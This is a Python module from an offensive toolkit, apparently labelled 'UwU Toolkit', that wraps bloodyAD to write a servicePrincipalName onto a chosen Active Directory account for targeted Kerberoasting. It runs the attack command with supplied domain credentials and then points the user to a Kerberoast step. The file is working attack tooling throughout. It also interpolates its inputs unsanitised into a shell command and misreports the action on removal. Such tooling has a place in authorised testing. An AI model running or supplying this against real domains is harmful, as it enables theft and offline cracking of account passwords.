"""
BloodyAD SPN Manipulation Module
Add/remove SPNs for targeted Kerberoasting attacks
"""

from core.module_base import ModuleBase, ModuleType, Platform


class BloodySetSPN(ModuleBase):
    """
    BloodyAD SPN manipulation module.
    Add SPNs to accounts for targeted Kerberoasting.
    """

    def __init__(self):
        super().__init__()
        self.name = "bloody_spn"
        self.description = "BloodyAD SPN manipulation - add/remove SPNs for targeted Kerberoasting"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "acl", "spn", "kerberoast", "bloodyad", "targeted"]
        self.references = [
            "https://github.com/CravateRouge/bloodyAD",
            "https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"
        ]

        # Core options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name", required=True)
        self.register_option("USER", "Username with WriteProperty permissions", required=True)
        self.register_option("PASS", "Password for USER", required=True)

        # Target options
        self.register_option("TARGET_USER", "Target user to add SPN to", required=True)
        self.register_option("SPN", "SPN value to add (e.g., HTTP/fake.domain.local)", required=True)
        self.register_option("ACTION", "Action to perform", default="add", choices=["add", "remove"])

        # Container
        self.register_option("EXEGOL_CONTAINER", "Exegol container (auto-detect if empty)", default="")

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        target_user = self.get_option("TARGET_USER")
        spn = self.get_option("SPN")
        action = self.get_option("ACTION")

        self.print_status(f"Target DC: {dc_ip}")
        self.print_status(f"Domain: {domain}")
        self.print_status(f"Attacking User: {user}")
        self.print_status(f"Target User: {target_user}")
        self.print_status(f"SPN: {spn}")
        self.print_status(f"Action: {action}")
        self.print_line()

        # Build command
        if action == "add":
            cmd = f"bloodyAD -u '{user}' -p '{password}' -d {domain} --host {dc_ip} set object '{target_user}' servicePrincipalName -v '{spn}'"
        else:
            cmd = f"bloodyAD -u '{user}' -p '{password}' -d {domain} --host {dc_ip} remove object '{target_user}' servicePrincipalName -v '{spn}'"

        self.print_status(f"Command: bloodyAD -u {user} -p [HIDDEN] -d {domain} --host {dc_ip} set object {target_user} servicePrincipalName -v {spn}")
        self.print_line()

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
        output = stdout + stderr

        # Check result
        if "updated" in output.lower() or ret == 0:
            self.print_good(f"SPN {action}ed successfully!")
            self.print_good(f"Target {target_user} now has SPN: {spn}")
            self.print_line()
            self.print_status("Next step - Kerberoast the target:")
            self.print_status(f"  use auxiliary/ad/kerberoast")
            self.print_status(f"  set TARGET_USER {target_user}")
            self.print_status(f"  run")
            return True
        else:
            self.print_error(f"SPN {action} failed")
            for line in output.split('\n'):
                if line.strip():
                    self.print_error(f"  {line}")
            return False

    def check(self) -> bool:
        ret, stdout, stderr = self.run_in_exegol("which bloodyAD", timeout=10)
        return ret == 0
